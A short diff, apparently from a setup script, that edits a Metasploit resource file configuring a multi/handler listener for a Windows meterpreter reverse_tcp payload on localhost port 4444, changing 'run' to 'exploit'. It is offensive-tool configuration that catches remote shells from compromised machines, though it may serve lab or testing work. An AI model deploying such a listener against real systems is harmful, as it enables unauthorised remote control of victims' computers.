@@ -33,7 +33,7 @@ use multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 127.0.0.1
 set LPORT 4444
-run
+exploit
 EOF
 
 echo "[*] Setup complete. To start the handler:"
